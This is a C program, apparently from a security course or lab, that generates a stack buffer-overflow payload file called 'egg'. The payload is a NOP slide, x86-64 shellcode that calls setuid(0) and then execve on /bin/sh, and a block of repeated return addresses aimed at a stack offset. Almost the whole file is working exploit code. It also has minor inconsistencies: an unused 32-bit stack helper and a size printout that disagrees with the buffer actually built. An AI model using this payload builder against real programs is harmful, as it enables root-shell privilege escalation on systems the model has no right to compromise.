#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

/* This builds an egg that consists of three parts:
 *		NOP slide
 *		Shell code
 *		Address Block
 *
 */
#define SHELLSZ		48
#define NOP		0x90
#define OFFSZ		800

char mkshell[] =
        "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
        "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
        "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
        "\x58\x0f\x05";
//char mkshell[] =
  //      "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
    //    "\x69\x6e\x2f\x6c\x73\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
      //  "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
        // "\x58\x0f\x05";

unsigned long *get_sp(void){
	__asm__("movl	%esp,%eax");
}

int main(int argc, char *argv[]){
	char *buf, *shell;
	unsigned long **addp, *addr;
	unsigned long nopsz, shellsz, addsz, bsize, offset,total;
	int i, fd;

	if( argc != 3 && argc != 4 ){
	fprintf(stderr, "Usage: <nop slide length> <address block length> [offset]\n");
	exit(-1);
	}
addr = (unsigned long *) 0x7ffffffff000; // adress to start at can be changed to a 32 bit addess 
                                     
	offset = (unsigned long)OFFSZ;
	errno = 0;
 //how many nops
	nopsz = strtol(argv[1], NULL, 0);
 //how many return address
	addsz = strtol(argv[2], NULL, 0);
	if(argc == 4){
	offset = (unsigned long)strtol(argv[3], NULL, 0);
	}
	if(errno != 0){
	fprintf(stderr, "Usage: <nop slide length> <address block length> [offset]\n");
	fprintf(stderr, "	Error: Non-decimal argument\n");
	exit(-1);
	}
	shellsz = SHELLSZ;
	printf("  Egg Structure\n");
	printf("	Nop slide size				%lu\n", nopsz);
	printf("	Shell code size				%lu\n", shellsz);
	printf("	Number of Address in Address Block	%lu\n", addsz);
	printf("	Offset					%lu\n", offset);
	printf("	Stack Address				%p\n", (void *)addr);
	addr = (unsigned long *)((unsigned long)addr - offset);
	printf("	Target Adress				%p\n", (void *)addr);
	total = nopsz + shellsz + (addsz*4);
	printf("  Total size of egg	%lu\n",total);
	addsz *= 8;

	bsize = nopsz + shellsz + addsz;
	if(!(buf = malloc(bsize+1)) ){
	printf("Malloc failure\n");
	exit(0);
	}
	shell = buf + nopsz;
	
	for( i = 0; i < nopsz; i++){
	buf[i] = NOP;
	}
	
	for(i = 0; i < shellsz; i++){
	*(shell++) = mkshell[i];
	}

	addp = (unsigned long**)(buf+nopsz+shellsz);
	while( (char *)addp < buf+bsize){
	*(addp++) = addr;
	}

	buf[bsize] = '\n';// puts a new line at the end 
	
	if((fd = open("egg",O_WRONLY|O_CREAT|O_TRUNC,0600)) < 0){
	perror("egg");
	exit(-1);
	}

	write(fd,buf,bsize+1);
	return(0);
}
